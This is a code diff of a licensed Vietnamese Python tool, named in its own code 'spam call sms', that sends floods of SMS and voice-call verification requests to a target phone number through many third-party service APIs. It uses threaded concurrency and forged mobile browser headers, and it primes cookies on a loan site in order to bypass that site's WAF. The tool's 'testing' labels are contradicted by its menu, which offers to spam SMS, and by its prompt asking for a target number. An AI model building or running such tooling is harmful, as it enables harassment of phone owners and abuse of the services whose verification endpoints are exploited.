@@ -13,68 +13,104 @@ from requests.adapters import HTTPAdapter
 from urllib3.util import Retry
 
 # ==========================================
-# CẤU HÌNH HỆ THỐNG & LICENSE
+# BỘ MÃ MÀU ANSI TRANG TRÍ TERMINAL
+# ==========================================
+C = '\033[96m'  # Cyan (Xanh lơ)
+G = '\033[92m'  # Green (Xanh lá)
+R = '\033[91m'  # Red (Đỏ)
+Y = '\033[93m'  # Yellow (Vàng)
+W = '\033[0m'   # White/Reset (Trắng - Trả về mặc định)
+
+# ==========================================
+# CẤU HÌNH HỆ THỐNG LICENSE (BẢN QUYỀN)
 # ==========================================
 SERVER_URL = "https://shopvietx.io.vn/api/license"
-TOOL_NAME = "spam call sms"
 KEY_FILE_PATH = os.path.join(os.path.expanduser("~"), ".matrix_sms_key")
-CONFIG_FILE_PATH = "apis_config.json"
-
-# Bật True để xem chi tiết Request/Response (Debug Mode)
-DEBUG_MODE = False 
 
 # ==========================================
-# CẤU HÌNH LOGGING
+# CẤU HÌNH LOGGING CÓ MÀU SẮC THỜI GIAN
 # ==========================================
-log_level = logging.DEBUG if DEBUG_MODE else logging.INFO
 logging.basicConfig(
-    level=log_level,
-    format="%(asctime)s %(message)s",
-    datefmt="[%H:%M:%S]",
+    level=logging.INFO,
+    format=f"{W}[%(asctime)s]{W} %(message)s",
+    datefmt="%H:%M:%S",
     handlers=[logging.StreamHandler()]
 )
 logger = logging.getLogger("MatrixCloudEngine")
 
 class CloudTestingEngine:
     def __init__(self):
-        self.timeout = 10 
-        self.api_database = self.load_config()
+        self.session = requests.Session()
+        self.timeout = 7 
+        self.init_session_policy()
+        self.api_database = self.load_apis_from_memory()
 
-    def load_config(self) -> Dict[str, List[Any]]:
-        """Đọc danh sách API từ file JSON cục bộ, giúp dễ dàng thêm/xóa không cần sửa code"""
-        if not os.path.exists(CONFIG_FILE_PATH):
-            logger.error(f"[-] Lỗi: Không tìm thấy file cấu hình '{CONFIG_FILE_PATH}'.")
-            return {"sms_endpoints": [], "call_endpoints": []}
-            
-        try:
-            with open(CONFIG_FILE_PATH, "r", encoding="utf-8") as f:
-                data = json.load(f)
-                logger.info(f"[+] Đã tải cấu hình: {len(data.get('sms_endpoints', []))} SMS, {len(data.get('call_endpoints', []))} Call.")
-                return data
-        except Exception as e:
-            logger.error(f"[-] Lỗi đọc file JSON: {str(e)}")
-            return {"sms_endpoints": [], "call_endpoints": []}
-
-    def execute_request_worker(self, api: Dict[str, Any], phone: str) -> bool:
-        """Worker xử lý độc lập từng API với Session riêng biệt, Retry tự động và Timeout"""
-        name = api.get("name", "Dịch vụ ẩn danh")
-        url = api.get("url")
-        method = api.get("method", "POST").upper()
-        headers = api.get("headers", {}).copy()
-        
-        # 1. Khởi tạo Session kèm cơ chế tự động Retry khi lỗi mạng
-        worker_session = requests.Session()
+    def init_session_policy(self) -> None:
+        """Cấu hình kết nối Connection Pool hạn chế tối đa lỗi mạng"""
         retries = Retry(
-            total=2, # Tự động thử lại 2 lần nếu gặp lỗi mạng
-            backoff_factor=0.5,
+            total=1,
+            backoff_factor=0.1,
             status_forcelist=[500, 502, 503, 504],
             raise_on_status=False
         )
-        adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1, max_retries=retries)
-        worker_session.mount("http://", adapter)
-        worker_session.mount("https://", adapter)
+        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retries)
+        self.session.mount("http://", adapter)
+        self.session.mount("https://", adapter)
+        self.session.headers.update({
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+        })
 
-        # 2. Xử lý logic đặc biệt cho Call IVR (VayXanh Bypass)
+    def load_apis_from_memory(self) -> Dict[str, List[Any]]:
+        """Đọc thẳng dữ liệu được truyền ngầm từ bộ nhớ RAM (globals)"""
+        if 'IN_MEMORY_DB' in globals():
+            return globals()['IN_MEMORY_DB']
+        
+        logger.error(f"{R}[!] Lỗi nghiêm trọng: Không tìm thấy cơ sở dữ liệu API trong RAM!{W}")
+        return {"sms_endpoints": [], "call_endpoints": []}
+
+    def sync_ivr_cookies(self, phone: str) -> None:
+        """Đồng bộ phiên kết nối (Cookie) cho cổng IVR VayXanh - ĐÃ SỬA THEO 6.PY"""
+        init_url = "https://lk.vayxanh.com/"
+        params = {
+            "phone": phone, 
+            "amount": "2000000", 
+            "term": "7",
+            "utm_source": "direct_vayxanh",
+            "utm_medium": "organic",
+            "utm_campaign": "direct_vayxanh",
+            "utm_content": "mainpage_submit"
+        }
+        headers = {
+            'accept': 'application/json, text/plain, */*',
+            'accept-language': 'vi-VN',
+            'origin': 'https://lk.vayxanh.com',
+            'referer': f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
+            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin'
+        }
+        try:
+            self.session.get(init_url, params=params, headers=headers, timeout=self.timeout)
+            
+            cookies_dict = requests.utils.dict_from_cookiejar(self.session.cookies)
+            if "_cabinet_key" not in cookies_dict:
+                config_url = "https://lk.vayxanh.com/internal/client/config"
+                self.session.get(config_url, headers=headers, timeout=self.timeout)
+        except Exception:
+            pass
+
+    def execute_request_worker(self, api: Dict[str, Any], phone: str) -> bool:
+        """Hàm gửi Request ngầm và in trạng thái sạch sẽ"""
+        name = api.get("name", "Dịch vụ ẩn danh")
+        url = api.get("url")
+        method = api.get("method", "POST").upper()
+        headers = api.get("headers", {}).copy() 
+        
+        # ĐÃ SỬA: Ép định dạng headers di động riêng cho luồng VayXanh để bypass WAF
         if url and "vayxanh" in url.lower():
             headers.update({
                 'accept': 'application/json, text/plain, */*',
@@ -82,133 +118,123 @@ class CloudTestingEngine:
                 'origin': 'https://lk.vayxanh.com',
                 'referer': f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7',
                 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
-                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
+                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                 'sec-ch-ua-mobile': '?1',
                 'sec-ch-ua-platform': '"Android"',
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin'
             })
-            worker_session.headers.update(headers)
-            try:
-                logger.debug(f"[{name}] Đang khởi tạo phiên Cookie...")
-                worker_session.get(f"https://lk.vayxanh.com/?phone={phone}", timeout=self.timeout)
-                if "_cabinet_key" not in requests.utils.dict_from_cookiejar(worker_session.cookies):
-                    worker_session.get("https://lk.vayxanh.com/internal/client/config", timeout=self.timeout)
-            except Exception as e:
-                logger.debug(f"[{name}] Lỗi khởi tạo phiên: {e}")
-        else:
-            worker_session.headers.update(headers)
         
-        # 3. Chuẩn bị định dạng số điện thoại và Payload
         phone_no_zero = phone[1:] if phone.startswith("0") else phone
         phone_84 = "84" + phone_no_zero
+        
         raw_template = api.get("payload_template", "")
         formatted_payload = raw_template.replace("{phone}", phone)\
-                                      .replace("{phone_no_zero}", phone_no_zero)\
-                                      .replace("{phone_84}", phone_84)
+                                         .replace("{phone_no_zero}", phone_no_zero)\
+                                         .replace("{phone_84}", phone_84)
 
         try:
-            request_kwargs = {"json": json.loads(formatted_payload)} if api.get("is_json") else {"data": formatted_payload}
+            if api.get("is_json"):
+                request_kwargs = {"json": json.loads(formatted_payload)}
+            else:
+                request_kwargs = {"data": formatted_payload}
 
-            logger.info(f"[▶ RUNNING] Đang kiểm thử cổng: {name}")
-            
-            # Thực thi Request
-            response = worker_session.request(
+            logger.info(f"{C}[▶ RUNNING] Đang kiểm thử cổng:{W} {name}")
+
+            response = self.session.request(
                 method=method,
                 url=url,
+                headers=headers,
                 timeout=self.timeout,
                 **request_kwargs
             )
             
-            if DEBUG_MODE:
-                logger.debug(f"[{name}] HTTP {response.status_code} | Response: {response.text[:200]}")
-
             if response.status_code == 200:
-                logger.info(f"  └── [✓ SUCCESS] {name} thành công.")
+                logger.info(f"  └── {G}[✓ SUCCESS] {name} thành công.{W}")
                 return True
             else:
-                logger.info(f"  └── [✕ FAILED] {name} phản hồi không chuẩn (Mã: {response.status_code}).")
+                logger.info(f"  └── {R}[✕ FAILED] {name} lỗi (Mã: {response.status_code}).{W}")
                 return False
 
         except requests.exceptions.Timeout:
-            logger.info(f"  └── [🕒 TIMEOUT] {name} quá hạn phản hồi. Bỏ qua.")
-        except Exception as e:
-            logger.info(f"  └── [✕ ERROR] Không thể kết nối tới {name}.")
-            if DEBUG_MODE:
-                logger.error(f"Chi tiết lỗi {name}: {str(e)}")
-        finally:
-            worker_session.close() # Giải phóng bộ nhớ của Session
+            logger.info(f"  └── {Y}[🕒 TIMEOUT] {name} quá hạn phản hồi. Bỏ qua.{W}")
+        except Exception:
+            logger.info(f"  └── {R}[✕ ERROR] Không thể kết nối tới {name}.{W}")
         
         return False
 
     def trigger_sms_suite(self, phone: str) -> None:
-        """Kích hoạt kiểm thử toàn bộ API SMS qua luồng song song"""
+        """Kích hoạt bắn đồng thời Suite SMS bằng đa luồng cực nhanh"""
         sms_list = self.api_database.get("sms_endpoints", [])
         if not sms_list:
-            print("[-] Không có cấu hình SMS nào để chạy.")
+            print(f"{R}[-] Danh sách API trống hoặc nạp từ RAM thất bại.{W}")
             return
 
-        print(f"\n[+] Khởi chạy Suite SMS: Đang thực thi {len(sms_list)} dịch vụ...")
-        print("-" * 55)
+        print(f"\n{G}[+] Khởi chạy Suite SMS: Đang thực thi {len(sms_list)} dịch vụ...{W}")
+        print(f"{C}-{W}" * 55)
         
-        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
             futures = [executor.submit(self.execute_request_worker, api, phone) for api in sms_list]
-            concurrent.futures.wait(futures) # Đợi tất cả SMS hoàn thành
+            concurrent.futures.wait(futures)
             
-        print("-" * 55)
-        print("[✓] Hoàn tất Suite SMS.")
+        print(f"{C}-{W}" * 55)
+        print(f"{G}[✓] Hoàn tất Suite SMS.{W}")
 
     def trigger_combined_suite(self, phone: str) -> None:
-        """Kịch bản tích hợp: Bắt buộc chạy xong SMS mới kích hoạt Call ở cuối luồng"""
-        # Bước 1: Chạy toàn bộ SMS
+        """Kịch bản tích hợp: SMS trước, Call (IVR) ở cuối quy trình"""
         self.trigger_sms_suite(phone)
         
-        time.sleep(2) # Nghỉ nhịp trước khi gọi Call
+        time.sleep(1.5)
         
-        # Bước 2: Chạy các API Call ở cuối luồng
         call_list = self.api_database.get("call_endpoints", [])
         if not call_list:
             return
 
-        print(f"\n[+] Khởi chạy Suite IVR (Call): Đang thực thi {len(call_list)} cuộc gọi thoại...")
-        print("-" * 55)
+        print(f"\n{G}[+] Khởi chạy Suite IVR: Đang thực thi {len(call_list)} cuộc gọi thoại...{W}")
+        print(f"{C}-{W}" * 55)
+        
+        self.sync_ivr_cookies(phone)
         
         with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
             futures = [executor.submit(self.execute_request_worker, api, phone) for api in call_list]
             concurrent.futures.wait(futures)
             
-        print("-" * 55)
-        print("[✓] Hoàn tất toàn bộ chuỗi tích hợp (SMS + Call).")
+        print(f"{C}-{W}" * 55)
+        print(f"{G}[✓] Hoàn tất toàn bộ chuỗi tích hợp.{W}")
 
 
 # ==========================================
 # CÁC HÀM TRỢ GIÚP: MÃ MÁY & CHECK LICENSE
 # ==========================================
 def get_hardware_id() -> str:
-    """Định danh phần cứng duy nhất"""
+    """Tự động lấy mã định danh phần cứng duy nhất (Mã máy) tùy thuộc vào OS"""
     current_os = platform.system().lower()
     raw_id = "UNKNOWN_DEVICE"
+    
     try:
         if current_os == "windows":
             cmd = "wmic csproduct get uuid"
             output = subprocess.check_output(cmd, shell=True).decode().split()
-            if len(output) >= 2: raw_id = output[1]
+            if len(output) >= 2:
+                raw_id = output[1]
         elif current_os == "linux":
-            for path in ["/etc/machine-id", "/var/lib/dbus/machine-id"]:
-                if os.path.exists(path):
-                    with open(path, "r") as f:
-                        raw_id = f.read().strip()
-                    break
+            if os.path.exists("/etc/machine-id"):
+                with open("/etc/machine-id", "r") as f:
+                    raw_id = f.read().strip()
+            elif os.path.exists("/var/lib/dbus/machine-id"):
+                with open("/var/lib/dbus/machine-id", "r") as f:
+                    raw_id = f.read().strip()
     except Exception:
         pass
+
     return hashlib.md5(raw_id.encode('utf-8')).hexdigest().upper()
 
 
 def verify_license_key(key: str, hardware_id: str) -> bool:
-    """Xác thực Key với Server"""
+    """Gửi yêu cầu xác thực Key và Mã máy lên Server ShopVietX"""
     try:
-        payload = {"license_key": key, "hwid": hardware_id, "tool": TOOL_NAME}
+        payload = {"license_key": key, "hwid": hardware_id, "tool": "spam call sms"}
         response = requests.post(SERVER_URL, json=payload, timeout=8)
         if response.status_code == 200:
             res_data = response.json()
@@ -220,58 +246,68 @@ def verify_license_key(key: str, hardware_id: str) -> bool:
 
 
 def check_authentication_flow():
-    """Luồng chặn xác thực bản quyền"""
+    """Luồng kiểm tra bản quyền nghiêm ngặt trước khi cho phép dùng Tool"""
     hw_id = get_hardware_id()
+    
     if os.path.exists(KEY_FILE_PATH):
         with open(KEY_FILE_PATH, "r", encoding="utf-8") as f:
-            if verify_license_key(f.read().strip(), hw_id):
-                return True 
+            saved_key = f.read().strip()
+        if saved_key and verify_license_key(saved_key, hw_id):
+            return True 
             
     while True:
         os.system("cls" if platform.system().lower() == "windows" else "clear")
-        print("=" * 64)
-        print("         XÁC THỰC BẢN QUYỀN HỆ THỐNG - SHOPVIETX.IO.VN       ")
-        print("=" * 64)
-        print(f"  [!] Trạng thái: Chưa kích hoạt bản quyền!")
-        print(f"  • Mã máy (HWID): {hw_id}")
-        print("  • Vui lòng gửi Mã máy trên cho Admin để mua bản quyền.")
-        print("-" * 64)
+        print(f"{C}=" * 64 + W)
+        print(f"{C}         XÁC THỰC BẢN QUYỀN HỆ THỐNG - SHOPVIETX.IO.VN       {W}")
+        print(f"{C}=" * 64 + W)
+        print(f"  {Y}[!] Trạng thái: Chưa kích hoạt bản quyền!{W}")
+        print(f"  {C}• Mã máy (HWID) của bạn: {W}{G}{hw_id}{W}")
+        print(f"  {C}• Vui lòng gửi Mã máy trên cho Admin để mua bản quyền.{W}")
+        print(f"{C}-" * 64 + W)
         
-        user_key = input("[?] Nhập Key bản quyền (Hoặc '0' để thoát): ").strip()
-        if user_key == "0": sys.exit(0)
-        if not user_key: continue
+        user_key = input(f"{G}[?] Nhập Key bản quyền của bạn (Hoặc bấm '0' để thoát): {W}").strip()
+        
+        if user_key == "0":
+            print(f"{G}[+] Đóng chương trình.{W}")
+            sys.exit(0)
             
-        print("[+] Đang kiểm tra mã khóa...")
+        if not user_key:
+            continue
+            
+        print(f"{G}[+] Đang kiểm tra mã khóa trên hệ thống Server...{W}")
         if verify_license_key(user_key, hw_id):
             with open(KEY_FILE_PATH, "w", encoding="utf-8") as f:
                 f.write(user_key)
-            print("[✓] KÍCH HOẠT THÀNH CÔNG! Đang vào hệ thống...")
+            print(f"{G}[✓] KÍCH HOẠT THÀNH CÔNG! Đang vào hệ thống...{W}")
             time.sleep(1.5)
             return True
         else:
-            print("[-] Lỗi: Key không hợp lệ hoặc không dùng cho máy này!")
-            input("\n[Nhấn Enter để thử lại...]")
+            print(f"{R}[-] Lỗi: Key không hợp lệ, đã hết hạn hoặc không dùng cho máy này!{W}")
+            input(f"\n{Y}[Nhấn Enter để thử lại...]{W}")
 
 
 def show_banner_introduction():
+    """Hiển thị phần giới thiệu thông tin công cụ sau khi đã qua bước check key"""
     os.system("cls" if platform.system().lower() == "windows" else "clear")
-    print("=" * 64)
-    print("         MATRIX NOTIFICATION TESTING SYSTEM SYSTEM          ")
-    print("   Chạy trên: Windows PE / Windows Desktop / Termux (Linux) ")
-    print("=" * 64)
-    print(f"  • Phiên bản: Legal Tester v4.0")
-    print(f"  • Mã máy: {get_hardware_id()}")
-    print(f"  • Trạng thái bản quyền: Đã kích hoạt [✓]")
-    print(f"  • Debug Mode: {'BẬT' if DEBUG_MODE else 'TẮT'}")
-    print("=" * 64)
+    hw_id = get_hardware_id()
+    
+    print(f"{C}=" * 64 + W)
+    print(f"{G}         MATRIX NOTIFICATION TESTING SYSTEM SYSTEM          {W}")
+    print(f"{C}   Chạy trên: Windows PE / Windows Desktop / Termux (Linux) {W}")
+    print(f"{C}=" * 64 + W)
+    print(f"  {C}• Phiên bản: {W}Cloud Integration v3.5 (Chạy trên RAM)")
+    print(f"  {C}• Hệ điều hành: {W}{platform.system()} {platform.release()}")
+    print(f"  {C}• Mã máy của bạn: {W}{hw_id}")
+    print(f"  {C}• Trạng thái bản quyền: {G}Đã kích hoạt [✓]{W}")
+    print(f"{C}=" * 64 + W)
 
 
 def render_terminal_menu():
-    print("\n" + "═"*20 + " MENU ĐIỀU KHIỂN CHÍNH " + "═"*20)
-    print("  [1] Chỉ spam SMS (SMS Only)")
-    print("  [2] Chạy toàn diện (SMS + Call)")
-    print("  [0] Thoát chương trình")
-    print("═"*64)
+    print(f"\n{C}═{W}"*20 + f"{C} MENU ĐIỀU KHIỂN CHÍNH {W}" + f"{C}═{W}"*20)
+    print(f"  {G}[1]{W} chỉ spam SMS (SMS Only)")
+    print(f"  {G}[2]{W} Chạy toàn diện (SMS + Call)")
+    print(f"  {G}[0]{W} Giải phóng bộ nhớ & Thoát chương trình")
+    print(f"{C}═{W}"*64)
 
 
 def run_application():
@@ -281,15 +317,15 @@ def run_application():
     
     while True:
         render_terminal_menu()
-        cmd = input("[?] Nhập tùy chọn (0-2): ").strip()
+        cmd = input(f"{G}[?] Nhập tùy chọn lệnh (0-2): {W}").strip()
         
         if cmd == "0":
-            print("[+] Đóng hệ thống!")
+            print(f"{G}[+] Bộ nhớ đệm đã được giải phóng sạch sẽ khỏi RAM. Đóng hệ thống!{W}")
             break
         elif cmd in ["1", "2"]:
-            phone = input("[?] Nhập số điện thoại cần test (Đã được cấp phép): ").strip()
+            phone = input(f"{G}[?] Nhập số điện thoại mục tiêu cần test: {W}").strip()
             if not phone or len(phone) < 9 or not phone.isdigit():
-                print("[-] Lỗi: Số điện thoại không hợp lệ!")
+                print(f"{R}[-] Lỗi: Số điện thoại không đúng định dạng chuỗi số!{W}")
                 continue
                 
             if cmd == "1":
@@ -297,9 +333,9 @@ def run_application():
             elif cmd == "2":
                 core_engine.trigger_combined_suite(phone)
                 
-            input("\n[Nhấn nút Enter để tiếp tục...]")
+            input(f"\n{Y}[Nhấn nút Enter để tiếp tục...]{W}")
         else:
-            print("[-] Mã lệnh không hợp lệ!")
+            print(f"{R}[-] Mã lệnh không hợp lệ!{W}")
 
 if __name__ == "__main__":
     run_application()
